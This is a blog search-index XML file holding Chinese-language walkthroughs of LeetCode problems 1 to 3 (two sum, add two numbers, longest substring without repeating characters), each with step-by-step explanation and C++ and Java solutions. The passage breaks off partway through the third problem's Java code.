<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>lc1-100</title>
      <link href="/2025/04/10/lc1-100/"/>
      <url>/2025/04/10/lc1-100/</url>
      
        <content type="html"><![CDATA[<h2 id="1-10"><a href="#1-10" class="headerlink" title="1-10"></a>1-10</h2><h3 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h3><h4 id="解题步骤：哈希表法"><a href="#解题步骤：哈希表法" class="headerlink" title="解题步骤：哈希表法"></a>解题步骤：哈希表法</h4><ol><li><strong>初始化哈希表</strong>：创建一个哈希表来存储数组元素的值及其对应的索引。</li><li><strong>遍历数组</strong>：逐个访问数组中的元素，索引为<code>i</code>，当前元素值为<code>a = nums[i]</code>。</li><li><strong>计算目标差值</strong>：对于每个元素<code>a</code>，计算需要查找的差值<code>b = target - a</code>。</li><li><strong>查找差值是否存在</strong>：在哈希表中查找<code>b</code>：<ul><li><strong>存在</strong>：返回当前索引<code>i</code>和哈希表中存储的<code>b</code>的索引。</li><li><strong>不存在</strong>：将当前元素<code>a</code>及其索引<code>i</code>存入哈希表，继续检查下一个元素。</li></ul></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unordered_map&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">twoSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">&gt;</span> umap<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> a <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> b <span class="token operator">=</span> target <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>umap<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">!=</span> umap<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token punctuation">{</span>i<span class="token punctuation">,</span>umap<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            umap<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">twoSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> a <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> b <span class="token operator">=</span> target <span class="token operator">-</span> a<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>                result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> result<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2. 两数相加"></a><a href="https://leetcode.cn/problems/add-two-numbers/">2. 两数相加</a></h3><h4 id="解题步骤：模拟法"><a href="#解题步骤：模拟法" class="headerlink" title="解题步骤：模拟法"></a>解题步骤：模拟法</h4><ol><li><strong>初始化指针和进位变量：</strong><ul><li><code>cur1</code>、<code>cur2</code>：用于遍历链表 <code>l1</code> 和 <code>l2</code>。</li><li><code>cur</code>：指向当前结果链表的最后一个有效节点。</li><li><code>jinwei</code>：用于记录加法过程中的进位。</li></ul></li><li><strong>同时遍历两个链表：</strong><ul><li>当 <code>cur1</code> 和 <code>cur2</code> 都不为空时，逐位相加。</li><li>把结果更新到 <code>cur1-&gt;val</code> 上，即直接修改 <code>l1</code> 链表。</li><li>记录进位 <code>jinwei</code>。</li><li>如果即将到达末尾，则用 <code>cur</code> 记录当前节点，为后续追加节点做准备。</li></ul></li><li><strong>处理 <code>l1</code> 剩余部分（如果 <code>l1</code> 更长）：</strong><ul><li>如果还有进位，则继续加上当前节点值，并更新。</li><li>否则直接跳出。</li></ul></li><li><strong>处理 <code>l2</code> 剩余部分（如果 <code>l2</code> 更长）：</strong><ul><li>如果还有进位，创建新节点追加到结果链表尾部。</li><li>如果没有进位了，就把 <code>l2</code> 剩下的节点接到结果链表上（复用原链表节点，节省空间）。</li></ul></li><li><strong>处理最后的进位（如果还有）：</strong><ul><li>创建一个新节点存储最后的进位，追加到结果链表末尾。最后返回<code>l1</code>。</li></ul></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"ListNode.h"</span></span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    ListNode<span class="token operator">*</span> <span class="token function">addTwoNumbers</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> l1<span class="token punctuation">,</span> ListNode<span class="token operator">*</span> l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ListNode<span class="token operator">*</span> cur1 <span class="token operator">=</span> l1<span class="token punctuation">;</span>        ListNode<span class="token operator">*</span> cur2 <span class="token operator">=</span> l2<span class="token punctuation">;</span>        ListNode<span class="token operator">*</span> cur<span class="token punctuation">;</span>        <span class="token keyword">int</span> jinwei <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> cur2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> sum <span class="token operator">=</span> cur1<span class="token operator">-&gt;</span>val <span class="token operator">+</span> cur2<span class="token operator">-&gt;</span>val <span class="token operator">+</span> jinwei<span class="token punctuation">;</span>            cur1<span class="token operator">-&gt;</span>val <span class="token operator">=</span> sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>            jinwei <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur1<span class="token operator">-&gt;</span>next <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">||</span> cur2<span class="token operator">-&gt;</span>next <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                cur <span class="token operator">=</span> cur1<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cur1 <span class="token operator">=</span> cur1<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>            cur2 <span class="token operator">=</span> cur2<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>jinwei <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">int</span> sum <span class="token operator">=</span> cur1<span class="token operator">-&gt;</span>val <span class="token operator">+</span> jinwei<span class="token punctuation">;</span>                cur1<span class="token operator">-&gt;</span>val <span class="token operator">=</span> sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>                jinwei <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur1<span class="token operator">-&gt;</span>next <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                cur <span class="token operator">=</span> cur1<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cur1 <span class="token operator">=</span> cur1<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur2 <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>jinwei <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">int</span> sum <span class="token operator">=</span> cur2<span class="token operator">-&gt;</span>val <span class="token operator">+</span> jinwei<span class="token punctuation">;</span>                <span class="token keyword">auto</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cur<span class="token operator">-&gt;</span>next <span class="token operator">=</span> a<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>                jinwei <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                cur<span class="token operator">-&gt;</span>next <span class="token operator">=</span> cur2<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cur2 <span class="token operator">=</span> cur2<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>jinwei <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">auto</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>jinwei<span class="token punctuation">)</span><span class="token punctuation">;</span>            cur<span class="token operator">-&gt;</span>next <span class="token operator">=</span> a<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> l1<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">ListNode</span> <span class="token function">addTwoNumbers</span><span class="token punctuation">(</span><span class="token class-name">ListNode</span> l1<span class="token punctuation">,</span> <span class="token class-name">ListNode</span> l2<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">ListNode</span> cur1 <span class="token operator">=</span> l1<span class="token punctuation">;</span><span class="token class-name">ListNode</span> cur2 <span class="token operator">=</span> l2<span class="token punctuation">;</span><span class="token class-name">ListNode</span> pre <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">int</span> jinwei <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> cur2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> sum <span class="token operator">=</span> cur1<span class="token punctuation">.</span>val <span class="token operator">+</span> cur2<span class="token punctuation">.</span>val <span class="token operator">+</span> jinwei<span class="token punctuation">;</span>cur1<span class="token punctuation">.</span>val <span class="token operator">=</span> sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>jinwei <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>cur1<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>pre <span class="token operator">=</span> cur1<span class="token punctuation">;</span><span class="token punctuation">}</span>cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>cur1 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>jinwei <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> sum <span class="token operator">=</span> cur1<span class="token punctuation">.</span>val <span class="token operator">+</span> jinwei<span class="token punctuation">;</span>cur1<span class="token punctuation">.</span>val <span class="token operator">=</span> sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>jinwei <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>cur1<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>pre <span class="token operator">=</span> cur1<span class="token punctuation">;</span><span class="token punctuation">}</span>cur1 <span class="token operator">=</span> cur1<span class="token punctuation">.</span>next<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>cur2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>jinwei <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> sum <span class="token operator">=</span> cur2<span class="token punctuation">.</span>val <span class="token operator">+</span> jinwei<span class="token punctuation">;</span>cur2<span class="token punctuation">.</span>val <span class="token operator">=</span> sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>jinwei <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>pre<span class="token punctuation">.</span>next <span class="token operator">=</span> cur2<span class="token punctuation">;</span>pre <span class="token operator">=</span> pre<span class="token punctuation">.</span>next<span class="token punctuation">;</span>cur2 <span class="token operator">=</span> cur2<span class="token punctuation">.</span>next<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>pre<span class="token punctuation">.</span>next <span class="token operator">=</span> cur2<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>jinwei <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            pre<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span>jinwei<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        <span class="token keyword">return</span> l1<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h3><h4 id="解题步骤：动态规划法"><a href="#解题步骤：动态规划法" class="headerlink" title="解题步骤：动态规划法"></a>解题步骤：动态规划法</h4><ol><li><strong>初始化辅助数组：</strong><ul><li>创建一个 <code>dp</code> 数组用于动态规划，<code>dp[i]</code> 表示以第 <code>i</code> 个字符为结尾的最长不重复子串的长度。</li><li>初始化 <code>dp[0] = 1</code>，即第一个字符的最长子串长度为 1。</li><li>初始化结果 <code>ans = 1</code>，用于记录最大值。</li></ul></li><li><strong>边界情况处理：</strong>如果字符串长度为 0，直接返回 0。</li><li><strong>遍历字符串，更新 dp 数组：</strong><ul><li>从第二个字符开始，依次向前遍历过去的 <code>dp[i-1]</code> 个字符（即前一个不重复子串的长度范围内）。</li><li>如果在这个范围内出现了与 <code>s[i]</code> 相同的字符：<ul><li>说明有重复，更新 <code>dp[i] = i - j</code>，即从重复字符之后开始的新子串长度。</li><li>设置 <code>flag = false</code> 表示出现重复。</li></ul></li><li>如果没有重复字符：<ul><li>可以直接在前一个子串的基础上延长一位，<code>dp[i] = dp[i-1] + 1</code>。</li></ul></li></ul></li><li><strong>更新最大长度：</strong>每次计算完 <code>dp[i]</code> 后，更新 <code>ans = max(ans, dp[i])</code>。</li><li><strong>返回最终结果：</strong>返回最长不重复子串的长度 <code>ans</code>。</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">lengthOfLongestSubstring</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> dp<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">bool</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&gt;=</span>i<span class="token operator">-</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> ans<span class="token punctuation">)</span><span class="token punctuation">{</span>                ans <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">lengthOfLongestSubstring</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> length<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&gt;=</span>i<span class="token operator">-</span>dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> ans<span class="token punctuation">)</span><span class="token punctuation">{</span>                ans <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token 